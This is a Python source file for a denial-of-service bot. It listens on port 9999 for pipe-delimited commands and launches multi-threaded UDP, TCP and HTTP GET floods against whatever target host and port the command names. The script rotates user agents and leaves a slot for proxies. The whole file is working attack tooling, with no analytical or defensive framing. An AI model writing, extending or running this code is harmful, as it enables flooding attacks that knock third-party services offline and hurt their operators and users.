import socket
import threading
import random
import time
import requests
import asyncio
import aiohttp
import sys

# User agents for HTTP flood
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B)...",
    # Add more here...
]

# Optional proxy list - you can extend this dynamically
PROXIES = [
    # "http://user:pass@proxyip:port",
]

def udp_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time() + duration
    payload = random._urandom(1024)
    while time.time() < timeout:
        try:
            sock.sendto(payload, (target_ip, target_port))
        except:
            pass

def tcp_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    payload = random._urandom(1024)
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target_ip, target_port))
            sock.send(payload)
            sock.close()
        except:
            pass

async def http_get_flood(target, port, duration, threads):
    timeout = time.time() + duration
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    url = f"http://{target}:{port}/"
    async with aiohttp.ClientSession() as session:
        while time.time() < timeout:
            try:
                async with session.get(url, headers=headers) as response:
                    await response.read()
            except:
                pass
            await asyncio.sleep(0)  # yield to event loop

def handle_command(command):
    try:
        # Expected format:
        # ID|TYPE|TARGET|PORT|DURATION|THREADS
        attack_id, attack_type, target, port, duration, threads = command.split("|")
        port = int(port)
        duration = int(duration)
        threads = int(threads)

        print(f"[{attack_id}] Attack type: {attack_type} on {target}:{port} for {duration}s with {threads} threads.")

        if attack_type == "UDP":
            for _ in range(threads):
                threading.Thread(target=udp_flood, args=(target, port, duration), daemon=True).start()

        elif attack_type == "TCP":
            for _ in range(threads):
                threading.Thread(target=tcp_flood, args=(target, port, duration), daemon=True).start()

        elif attack_type == "HTTP-GET":
            # Run asyncio loop for HTTP flood
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            tasks = [http_get_flood(target, port, duration, threads) for _ in range(threads)]
            loop.run_until_complete(asyncio.gather(*tasks))
            loop.close()

        else:
            print(f"Unknown attack type: {attack_type}")

    except Exception as e:
        print(f"Failed to handle command: {e}")

def listen_for_commands():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print("[*] Bot listening on port 9999")

    while True:
        client, addr = server.accept()
        command = client.recv(1024).decode().strip()
        print(f"Received command from {addr}: {command}")
        threading.Thread(target=handle_command, args=(command,), daemon=True).start()
        client.close()

if __name__ == "__main__":
    listen_for_commands()
